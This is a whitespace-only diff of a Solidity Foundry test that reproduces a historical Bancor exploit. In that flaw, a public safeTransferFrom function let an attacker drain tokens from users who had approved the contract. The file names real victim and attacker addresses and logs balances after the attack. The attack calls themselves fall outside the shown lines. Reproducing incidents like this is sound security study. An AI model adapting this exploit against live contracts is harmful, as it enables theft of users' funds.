@@ -16,10 +16,13 @@ The attacker can check if an user had granted an allowance to Bancor Contracts t
 Example tx - https://etherscan.io/tx/0x4643b63dcbfc385b8ab8c86cbc46da18c2e43d277de3e5bc3b4516d3c0fdeb9f*/
 
 interface IBancor {
+
     function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
+
 }
 
 contract BancorExploit is Test {
+
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
     address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
@@ -50,4 +53,5 @@ contract BancorExploit is Test {
         emit log_named_uint("[After Attack]Victim XBPToken Balance : ", (XBPToken.balanceOf(victim)) / 1 ether);
         emit log_named_uint("[After Attack]Attacker XBPToken Balance : ", (XBPToken.balanceOf(attacker)) / 1 ether);
     }
+
 }
